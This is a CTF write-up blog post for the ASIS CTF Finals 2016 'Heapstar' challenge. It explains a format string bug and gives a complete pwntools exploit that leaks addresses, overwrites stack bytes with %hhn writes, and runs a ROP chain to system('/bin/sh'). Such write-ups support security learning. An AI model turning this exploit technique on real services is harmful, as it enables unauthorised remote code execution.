---
layout: post
alias: "/blog/2016/09/12/asis-ctf-finals-2016-heapstar/"
date: "2016-09-12T02:27:02+09:00"
title: "ASIS CTF Finals 2016: Heapstar"
tags: [ "ctf", "writeup", "asis-ctf", "pwn", "format-string-attack" ]
---

Not difficult. It seems that I solved with non-expected solution (because I didn't use the `hp*` and `list*` function), but I like this.

## solution

There is a format string bug, but the writable buffer is on the heap.
We can rewrite only the places whose address is on the stack.
There are the `argv` and `argv[0]`.
I used `argv` to modify the least byte of `argv[0]`, `argv[0]` to construct a payload on somewhere of stack, and the payload to rewrite the return address.

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='heapstar.asis-ctf.ir')
parser.add_argument('port', nargs='?', default=1337, type=int)
parser.add_argument('--no-echo', action='store_true')
args = parser.parse_args()
context.arch = 'x86_64'
# context.log_level = 'debug'

elf = ELF('./heapstar')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # ubuntu 16.04

p = remote(args.host, args.port)
# p = process('./heapstar')
# args.no_echo = True

def cmd(c, s=None):
    p.recvuntil('>> ')
    p.sendline(c)
    if not args.no_echo:
        assert p.recv(len(c) + 2) == c + '\r\n'
    assert (c == 'i') == (s is not None)
    if c == 'i':
        if not args.no_echo:
            assert p.recv(6) == 'Data: '
        p.sendline(s)
        if not args.no_echo:
            assert p.recv(len(s + '\r\n')) == s + '\r\n'
    if c == 'p':
        s = p.recvuntil('>> ', timeout=1)
        if s:
            p.unrecv('>> ')
            return s[: -3 ]
        else:
            return ''

def fsa(s):
    log.info('format string attack: %s', repr(s))
    cmd('c')
    cmd('i', s)
    s = cmd('p')
    log.info('    =>  %s', repr(s))
    return s

# leak addresses
heap_base = int(fsa('%19$p'), 16) - 0x10
log.info('heap_base: %#x', heap_base)
libc_start_main = int(fsa('%21$p'), 16) - 240 # %21$s: <__libc_start_main+240>
libc_base = libc_start_main - libc.symbols['__libc_start_main']
log.info('libc base: %#x', libc_base)
argv = int(fsa('%23$p'), 16) # %23$s: argv (char **)
log.info('argv: %#x', argv)
argv_0 = int(fsa('%49$p'), 16) # %49$s: argv[0] (char *)
log.info('argv[0]: %#x', argv_0)

# prepare buffer
fsa('%23$hhn')
k = (argv_0 - argv_0 % 0x100 - argv) // 8 + 49
log.info('k: %d', k) # %k$p: argv[0][0] (char[8])
def seek(i):
    if i == 0:
        i = 256
    fsa('%{}c%23$hhn'.format(i))
def putc(c):
    c = ord(c)
    if c == 0:
        c = 256
    fsa('%{}c%49$hhn'.format(c))
def puts(s):
    for i, c in enumerate(s):
        seek(i)
        putc(c) # write char by char

# writing test
puts('AAAABBBB\0')
seek(0)
assert fsa('%49$s') == 'AAAABBBB'
assert int(fsa('%{}$p'.format(k)), 16) == u64('AAAABBBB')

# do rop
def puts2(addr, s):
    payload = ''
    for i in range(len(s)):
        payload += p64(addr + i)
    puts(payload) # write addresses to write on
    l = 0
    payload = ''
    for i, c in enumerate(s):
        if ord(c) != l:
            payload += '%{}c'.format((ord(c) - l) % 256)
        payload += '%{}$hhn'.format(k + i)
        l = ord(c)
    fsa(payload)
pop_rdi_ret = ROP(elf).find_gadget(['pop rdi']).address
bin_sh = libc_base + next(libc.search('/bin/sh\0'))
system = libc_base + libc.symbols['system']
stack = argv - 0x160 # top at printf
chain = ''.join([ p64(x) for x in [ pop_rdi_ret, bin_sh, system ] ])
puts2(stack, chain)

time.sleep(1)
p.sendline('id')
p.interactive()
```
